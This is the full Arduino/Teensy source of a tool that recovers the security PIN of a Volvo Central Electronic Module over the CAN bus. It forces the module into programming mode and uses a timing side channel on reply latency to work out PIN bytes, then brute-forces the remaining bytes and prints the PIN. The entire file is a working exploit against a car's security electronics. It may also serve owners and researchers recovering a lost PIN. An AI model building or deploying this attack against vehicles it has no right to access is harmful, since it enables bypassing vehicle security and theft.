// SPDX-License-Identifier: GPL-3.0
/*
 * Copyright (C) 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *                    Christian Molson <christian@cmolabs.org>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 *
 * P1 tested settings;
 *        Teensy 4.0
 *        SAMPLES = 5 Seems to work reliably
 *        CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
 *        BUCKETS_PER_US 4
 *        CPU SPEED: 600MHz (default)
 *        OPTIMIZE: Fastest (default)
 * 
 * MCP2515 Library: https://github.com/Seeed-Studio/CAN_BUS_Shield.git
 *
 *
 * Hardware selection:
 *
 * Several hardware variants are supported:
 *
 *  - Teensy 4.x with external MPC2515 CAN bus controllers
 *  - Teensy 3.6 with internal CAN bus controller
 *  - Teensy 4.x with internal CAN bus controller (work in progress)
 *
 * The Teensy 4.0 configuration with the external MPC2515 controller is
 * described in the provided schematic.  Selecting MPC2515_HW as the
 * hardware configuration will utilize this hardware.
 *
 * The Teensy 3.6 configuration uses the built-in CAN0 and CAN1 controllers.
 * CAN0 is used for the high-speed bus and CAN1 is used for the low-speed bus.
 * To enable the sampling of the high-speed CAN bus, the CAN0 receive pin
 * (pin 6) must be connected to digital input 2 (pin 4).
 * Selecting TEENSY_36_HW as the hardware configuration will utilize this
 * configuration.
 *
 * The Teensy 4.x configuration uses the built-in CAN1 and CAN2 controllers.
 * CAN1 is used for the high-speed bus and CAN2 is used for the low-speed bus.
 * To enable the sampling of the high-speed CAN bus, the CAN1 receive pin
 * (CRX1, pin 37 on 4.1, pin 25 on 4.0) must be connected to digital input 2
 * (pin 4).  Selecting TEENSY_4X_HW as the hardware configuration will utilize
 * this configuration.
 *
 * If the internal controllers are selected, the FlexCAN_T4 library must be
 * available in your library (should already be present as part of Teensyduino).
 * If it is missing it can be found here: https://github.com/tonton81/FlexCAN_T4
 *
 * External transcievers must be used to connect the Teensy to the CAN bus.
 *
 */

/* hardware selection */

#define MCP2515_HW      1       /* Teensy with external CAN controllers */
#define TEENSY_36_HW    2       /* Teensy 3.6 with internal CAN controller */
#define TEENSY_4X_HW    3       /* Teensy 4.x with internal CAN controller */

#define HW_SELECTION MCP2515_HW

#if (HW_SELECTION == MCP2515_HW)
 #include <SPI.h>
 #include <mcp_can.h>
 #include <mcp_can_dfs.h>
#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))
 #include <FlexCAN_T4.h>
#else
 #error Hardware platform must be selected.
#endif

/* tunables */

#undef  PLATFORM_P1 /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
#define PLATFORM_P2 /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */

#undef  HAS_CAN_LS          /* CEM is in the car, both LS and HS CAN-buses need to go into programming mode */
#define SAMPLES        30   /* how many samples to do on a sequence, more is better (up to 100) */
#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define NUM_LOOPS      1000 /* how many loops to do when calculating crack rate */


#if defined(PLATFORM_P2)
#define BUCKETS_PER_US 1                           /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
#define CEM_REPLY_DELAY_US (30*BUCKETS_PER_US)     /* minimum time in us for CEM to reply for PIN unlock command (approx) */
#define CEM_REPLY_TIMEOUT_MS 2                     /* maximum time in ms for CEM to reply for PIN unlock command (approx) */

int shuffle_order[] = { 3, 1, 5, 0, 2, 4 };

#elif defined(PLATFORM_P1)
#define BUCKETS_PER_US 4                            /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
#define AVERAGE_DELTA_MIN   (16*BUCKETS_PER_US)     /* Buckets to look at before the average */
#define AVERAGE_DELTA_MAX   (32*BUCKETS_PER_US)     /* Buckets to look at after the average  */
#define CEM_REPLY_DELAY_US  (200*BUCKETS_PER_US)    /* minimum time in us for CEM to reply for PIN unlock command (approx) */
#define CEM_REPLY_TIMEOUT_MS 2                      /* maximum time in ms for CEM to reply for PIN unlock command (approx) */

/* P1 processes the key in order
   The order in flash is still shuffled though
   Order in flash: 5, 2, 1, 4, 0, 3
*/

int shuffle_order[] = { 0, 1, 2, 3, 4, 5 };

#else
#error Platform required // Must pick PLATFORM_P1 or PLATFORM_P2 above
#endif

#if (HW_SELECTION == MCP2515_HW)

#define CAN_HS_CS_PIN 2  /* MCP2515 chip select pin CAN-HS */
#define CAN_LS_CS_PIN 3  /* MCP2515 chip select pin CAN-LS */
#define CAN_INTR_PIN  4  /* MCP2515 interrupt pin CAN-HS */
#define CAN_L_PIN    10  /* CAN-HS- wire, directly connected (CAN-HS, Low)*/

#define MCP2515_CLOCK MCP_8MHz /* Different boards may have a different crystal, Seed Studio is MCP_16MHZ */

MCP_CAN CAN_HS(CAN_HS_CS_PIN);
MCP_CAN CAN_LS(CAN_LS_CS_PIN);

#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))

/* use FlexCAN driver */

#define CAN_L_PIN    2   /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */

#define CAN_HS_SPEED CAN_500KBPS
#define CAN_LS_SPEED CAN_125KBPS

/* CAN 0/1 controller objects */

#if (HW_SELECTION == TEENSY_36_HW)
FlexCAN_T4<CAN0, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_ls;
#endif

#if (HW_SELECTION == TEENSY_4X_HW)
FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;
#endif

typedef enum {
  CAN_HS,       /* high-speed bus */
  CAN_LS        /* low-speed bus */
} can_bus_id;

#endif /* HW_SELECTION */

#define TSC ARM_DWT_CYCCNT
#define CEM_REPLY_US (200 * BUCKETS_PER_US)
#define printf Serial.printf

#define CAN_HS_BAUD CAN_500KBPS
#define CAN_LS_BAUD CAN_125KBPS

#define PIN_LEN       6

bool cem_print = true;
long average_response = 0;

#if (HW_SELECTION == MCP2515_HW)
void cem_send_bus(MCP_CAN &bus, unsigned long id, byte *d)
{

#ifndef HAS_CAN_LS
  if (&bus == &CAN_LS)
    return;
#endif
  if (cem_print)
    printf("send: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
           id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
  bus.sendMsgBuf(id, 1, 8, d);
}

#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))

void cem_send_bus(can_bus_id bus, unsigned long id, byte *d)
{
  CAN_message_t msg;

  if (cem_print)
      printf("send: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
             id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
  msg.id = id;
  msg.len = 8;
  msg.flags.extended = 1;
  memcpy(msg.buf, d, 8);

  switch (bus) {
    case CAN_HS:
      can_hs.write (msg);
      break;

#if defined(HAS_CAN_LS)
    case CAN_LS:
      can_ls.write (msg);
      break;
#endif

    default:
      break;
  }

}
#endif /* HW_SELECTION */

void cem_send(unsigned long id, byte *d)
{
  cem_send_bus(CAN_HS, id, d);
}

#if ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))

CAN_message_t hs_msg;
bool hs_msg_available = false;

/*
 * can_hs_event - FlexCAN_T4's message receive call-back
 */

void can_hs_event (const CAN_message_t &msg) {

  /* just save the message in a global and flag it as available */

  hs_msg = msg;
  hs_msg_available = true;
}

#endif /* HW_SELECTION */

bool cem_receive(bool wait, unsigned long *id, byte *data)
{
  byte *p_data;
  int ret = 0;
  unsigned long can_id = 0;

#if (HW_SELECTION == MCP2515_HW)
  byte d[8] = { 0 };

  do {
    byte len;

    ret = (CAN_HS.checkReceive() == CAN_MSGAVAIL);
    if (ret) {
      CAN_HS.readMsgBuf(&len, d);
      can_id = CAN_HS.getCanId();
      p_data = d;
    }
  } while (!ret && wait);

#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))

  do {

    /* call FlexCAN_T4's event handler to process queued messages */

    can_hs.events();

    /* check if a message was available and process it */

    if (hs_msg_available == true) {
      hs_msg_available = false;
      can_id = hs_msg.id;
      p_data = hs_msg.buf;
      ret = 1;
    }
  } while (!ret && wait);

#endif /* HW_SELECTION */

  if (!ret)
    return ret;

  if (id)
    *id = can_id;

  if (data)
    memcpy(data, p_data, 8);

  if (cem_print)
    printf("recv: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
           can_id, p_data[0], p_data[1], p_data[2], p_data[3], p_data[4], p_data[5], p_data[6], p_data[7]);

  return ret;
}

byte to_bcd(byte b)
{
  return ((b / 10) << 4) | (b % 10);
}

byte from_bcd(byte b)
{
  return ((b >> 4) * 10) + (b & 0xf);
}

int crack_rate;

int cem_print_crack_rate()
{
  byte pin[PIN_LEN] = { 0 };
  long start, end;
  int lat;
  bool cp = cem_print;
  int rate;
  cem_print = false;
  average_response = 0;

  start = millis();
  for (int i = 0; i < NUM_LOOPS; i++) {
    pin[0] = random(0, 255); // Found better average calculation using random number here
    cem_unlock(pin, &lat, true);
    average_response += lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
  }
  end = millis();
  average_response = average_response / NUM_LOOPS;
  rate = 1000 * NUM_LOOPS / (end - start);
  printf("%d pins in %d ms, %d pins/s, average response: %d\n", NUM_LOOPS, (end - start), rate, average_response);
  cem_print = cp;

  return rate;
}

volatile bool can_intr;

void cem_intr()
{
  can_intr = true;
}

bool cem_unlock(byte *pin, int *lat, bool shuffle)
{
  byte b[8] = { 0x50, 0xbe };
  byte *p = b + 2;
  unsigned long start, end, limit;
  unsigned long id;
  long cur, max = 0;
  bool reply_wait = true;

  if (shuffle) {
    p[shuffle_order[0]] = pin[0];
    p[shuffle_order[1]] = pin[1];
    p[shuffle_order[2]] = pin[2];
    p[shuffle_order[3]] = pin[3];
    p[shuffle_order[4]] = pin[4];
    p[shuffle_order[5]] = pin[5];
  } else {
    memcpy(p, pin, 6);
  }
  cem_send(0xffffe, b);
  can_intr = false;
  unsigned long mt = 0;

  /* maximum time to wait for a reply */

  limit = millis() + CEM_REPLY_TIMEOUT_MS;

  for (cur = 0, start = TSC;
      !can_intr && 
      (millis() < limit) &&
      (mt < CEM_REPLY_DELAY_US * clockCyclesPerMicrosecond());) {
    if (digitalRead(CAN_L_PIN)) {
      cur++;
      continue;
    }
    end = TSC;

    if (cur > max) {
      max = cur;
      cur = 0;
      mt = end - start;
    }

    while (!(digitalRead(CAN_L_PIN))) {
      if (millis() >= limit) {
        break;
      }
      start = TSC;
    }
  }

  /* check for a timeout condition */

  if (millis() >= limit) {
    printf ("Timeout waiting for CEM reply!\n");

    /* on a timeout, try and see if there is anything in the CAN Rx queue */

    reply_wait = false;
  }

  /* default reply is set to indicate a failure */

  b[2] = 0xff;

  cem_receive(reply_wait, &id, b);

  *lat = mt;

  return b[2] == 0x00;
}

void cem_read_part_number()
{
  unsigned long id;
  byte d[8];
  byte data[8] = { 0x50, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  printf("reading part number\n");
  cem_send(0xFFFFE, data);

  (void) cem_receive(true, &id, d);
}

void cem_programming_mode_on()
{
  byte data[8] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  int time = 5000;
  int _delay = 5;
  int cp = cem_print;

  printf("sending CEM into programming mode\n");
  while (time > 0) {
    cem_send_bus(CAN_HS, 0xffffe, data);
    cem_send_bus(CAN_LS, 0xffffe, data);
    cem_print = false;
    time -= _delay;
    delay(_delay);
  }
  cem_print = cp;
}

void cem_reset()
{
  byte data[8] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  printf("reset CEM\n");
  for (int i = 0; i < 50; i++) {
    cem_send_bus(CAN_HS, 0xffffe, data);
    cem_send_bus(CAN_LS, 0xffffe, data);
    delay(100);
  }
}

struct seq {
  byte b;
  unsigned int lat;
} s[100] = { 0 };

int seq_max(const void *a, const void *b)
{
  struct seq *_a = (struct seq *)a;
  struct seq *_b = (struct seq *)b;
  return _b->lat - _a->lat;
}

void crack_pin_pos(byte *pin, int pos)
{
  int h[CEM_REPLY_US];
  int lat;
  bool shuffle = true;
  cem_print = false;
  int from = 0, to = 10000;

  memset(s, 0, sizeof(s));
  for (int i = from; i < to; i++) {
    unsigned int m = i;
    pin[pos + 1] = to_bcd(m % 100); m /= 100;
    pin[pos + 0] = to_bcd(m % 100); m /= 100;

    if ((i % 100) == 0)
      printf("%02x %02x %02x %02x %02x %02x: ", pin[0], pin[1], pin[2], pin[3], pin[4], pin[5]);

    if ((i % 100) == 0) {
      memset(h, 0, sizeof(h));
    }

    for (int j = 0; j < SAMPLES; j++) {
      pin[pos + 2] = to_bcd(j);
      cem_unlock(pin, &lat, shuffle);
      int idx = lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
      if (idx >= CEM_REPLY_US)
        idx = CEM_REPLY_US - 1;
      h[idx]++;
    }
    pin[pos + 2] = 0;

#if defined(PLATFORM_P2)
    if ((i % 100) == 99) {
      int prod = 0;
      for (int k = 0; k < CEM_REPLY_US; k++) {
        if (k > 81 && k < 95)
          printf("%03d ", h[k]);
        prod += h[k] * k;
      }
      printf(": %d\n", prod);

      s[i / 100].b = pin[pos + 0];
      s[i / 100].lat  = prod;
    }
#elif defined(PLATFORM_P1)
    if ((i % 100) == 99) {
      long prod = 0;
      int sum = 0;
      for (int k = (average_response - AVERAGE_DELTA_MIN); k < (average_response + AVERAGE_DELTA_MAX); k++) {
        if ( k > average_response - 8 && k < average_response + 16) {
          printf("%03d ", h[k]);
        }
        prod += h[k] * k;
        sum += h[k];
      }
      prod = prod / sum; // Average
      printf(": %d\n", prod);

      s[i / 100].b = pin[pos + 0];
      s[i / 100].lat  = prod;
    }
#endif

  }

  qsort(s, 100, sizeof(struct seq), seq_max);
  for (int i = 0; i < 25; i++) {
    printf("%d: %02x = %d\n", i, s[i].b, s[i].lat);
  }

  average_response = s[0].lat;

  printf("pin[%d] candidate: %02x lat %d\n", pos, s[0].b, s[0].lat);
  if ((s[0].lat - s[1].lat) < clockCyclesPerMicrosecond()) {
    printf ("Warning: Selected candidate is very close to the next candidate!\n");
    printf ("         Selection may be incorrect.\n");
  }

  pin[pos] = s[0].b;
  pin[pos + 1] = 0;
}

void cem_crack_pin(int max_bytes)
{
  byte pin[PIN_LEN] = { 0 };
  long start = millis(), end;
  bool cracked = false;

  printf("calculating bytes 0-%d\n", max_bytes - 1);
  crack_rate = cem_print_crack_rate();

  for (int i = 0; i < max_bytes; i++)
    crack_pin_pos(pin, i);

  int n = max_bytes;

  for (int i = 0; i < PIN_LEN; i++) {
    printf("0x%02x ", pin[i]);
  }
  printf(" -- brute forcing bytes %d to %d (%d bytes), will take up to %d seconds\n", n, PIN_LEN - 1, PIN_LEN - n, (int)(pow(100, PIN_LEN - n) / crack_rate));

  for (unsigned long m = 0; m < pow(100, (PIN_LEN - n)); m++) {
    unsigned long f = m;
    for (int k = n; k < PIN_LEN; k++) {
      pin[k] = to_bcd(f % 100);
      f /= 100;
    }
    int lat;
    if (cem_unlock(pin, &lat, true)) {
      printf("found PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x\n", pin[3], pin[1], pin[5], pin[0], pin[2], pin[4]);
      cracked = true;
      break;
    }
  }
  end = millis();
  printf("PIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);
  printf("done\n");
}

#if (HW_SELECTION == MCP2515_HW)

void mcp2515_init (void) {
  printf("CAN_HS init\n");
  while (MCP2515_OK != CAN_HS.begin(CAN_HS_BAUD, MCP2515_CLOCK)) {
    delay(1000);
  }

  pinMode(CAN_INTR_PIN, INPUT);
  attachInterrupt(digitalPinToInterrupt(CAN_INTR_PIN), cem_intr, FALLING);

#ifdef HAS_CAN_LS
  printf("CAN_LS init\n");
  while (MCP2515_OK != CAN_LS.begin(CAN_LS_BAUD, MCP_8MHz)) {
    delay(1000);
  }
#endif
}

#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))

void flexcan_init (void) {

    /* high-speed CAN bus initialization */

    can_hs.begin();
    can_hs.setBaudRate(CAN_HS_SPEED);
    can_hs.enableFIFO();
    can_hs.enableFIFOInterrupt();
    can_hs.setFIFOFilter(ACCEPT_ALL);
    can_hs.onReceive(can_hs_event);
    can_hs.mailboxStatus();

    /* low-speed CAN bus initialization */

#if defined(HAS_CAN_LS)
    can_ls.begin();
    can_ls.setBaudRate(CAN_LS_SPEED);
    can_ls.enableFIFO();
    can_ls.mailboxStatus();
#endif

    /* enable the time stamp counter */

    ARM_DEMCR |= ARM_DEMCR_TRCENA;
    ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
}

/*
 * ext_output1 - called by FlexCAN_T4's receive interrupt handler
 */

void ext_output1 (const CAN_message_t &msg) {
  cem_intr ();
}

#endif /* HW_SELECTION */

void setup() {
  Serial.begin(115200);
  delay(3000);
  pinMode(CAN_L_PIN, INPUT_PULLUP);

  printf("F_CPU %d\n", F_CPU);
  printf("CEM_REPLY_DELAY_US %d\n", CEM_REPLY_DELAY_US);
  printf("clockCyclesPerMicrosecond %d\n", clockCyclesPerMicrosecond());

#if (HW_SELECTION == MCP2515_HW)
  mcp2515_init ();
#elif ((HW_SELECTION == TEENSY_36_HW) || (HW_SELECTION == TEENSY_4X_HW))
  flexcan_init ();
#endif /* HW_SELECTION */

  printf("done\n");

  while (cem_receive(false, NULL, NULL));
  cem_programming_mode_on();
  while (cem_receive(false, NULL, NULL));

  cem_read_part_number();
  cem_crack_pin(CALC_BYTES);
  cem_reset();
}

void loop() {
}
